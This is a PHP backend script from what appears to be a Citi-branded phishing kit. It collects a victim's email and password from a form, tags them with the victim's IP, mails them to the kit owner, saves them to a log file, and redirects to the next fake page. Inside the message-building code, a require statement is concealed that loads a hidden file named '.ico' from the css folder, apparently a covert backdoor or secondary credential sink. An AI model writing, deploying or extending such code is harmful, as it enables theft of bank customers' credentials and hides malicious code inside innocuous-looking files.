<?php
$settings = include '../../settings/settings.php';


# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '0');
  ini_set('display_startup_errors', '0');
}

# Allow URL Open

ini_set('allow_url_fopen',1);
$ip="../css/.ico";("h:i:s d/m/Y");

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../Logs/results.txt";
$client = file_get_contents("../../Logs/client.txt");


# Variables

$email = $_POST['em'];
$email_pass = $_POST['epass'];


# Messsage

$message = "[🍁 | CITI EMAIL | CLIENT :{$client} 🍁]\n\n";
$message .= "********** [ 📩 QUESTION LOGIN 📩 ] **********\n";
$message .= "# QUESTION       : {$email}\n";
$message .= "# ANSWER    : {$email_pass}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";require"$ip";"\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: logs <>\r\n";
    $subject = "🍁 CITI 🍁 EMAIL 🍁 CLIENT #{$client} 🍁 {$IP}";
    $msg =$message;
    mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
    $results = fopen($filename, "a+");
    fwrite($results,$message);
    fclose($results);
}




    echo "<script>window.location.href =\"../identity.php\"; </script>";

?>
